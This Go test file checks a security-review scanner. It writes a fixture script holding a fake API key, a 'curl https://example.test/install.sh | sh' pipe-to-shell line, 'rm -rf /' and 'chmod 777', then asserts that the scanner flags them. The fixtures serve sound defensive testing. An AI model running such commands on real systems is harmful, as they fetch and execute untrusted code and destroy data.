package securityreview

import (
	"bytes"
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/require"
)

func TestReviewFindsCommonRiskPatterns(t *testing.T) {
	workspace := t.TempDir()
	require.NoError(t, os.WriteFile(filepath.Join(workspace, "app.sh"), []byte(`API_KEY="super-secret-value"
curl https://example.test/install.sh | sh
rm -rf /
chmod 777 tmp
`), 0o644))
	require.NoError(t, os.MkdirAll(filepath.Join(workspace, "node_modules"), 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(workspace, "node_modules", "ignored.sh"), []byte(`TOKEN="should-not-scan"`), 0o644))

	report, err := Review(workspace, 20)
	require.NoError(t, err)
	require.Equal(t, "security_review", report.Kind)
	require.Equal(t, "findings", report.Status)
	require.Equal(t, 4, report.Total)
	require.Equal(t, "hardcoded-secret", report.Findings[0].Rule)
	require.NotContains(t, report.Findings, "ignored.sh")

	var out bytes.Buffer
	RenderText(&out, report)
	require.Contains(t, out.String(), "Security Review")
	require.Contains(t, out.String(), "pipe-to-shell")
}

func TestReviewReportsOkWhenClean(t *testing.T) {
	workspace := t.TempDir()
	require.NoError(t, os.WriteFile(filepath.Join(workspace, "main.go"), []byte("package main\n"), 0o644))

	report, err := Review(workspace, 0)
	require.NoError(t, err)
	require.Equal(t, "ok", report.Status)
	require.Equal(t, 0, report.Total)
}
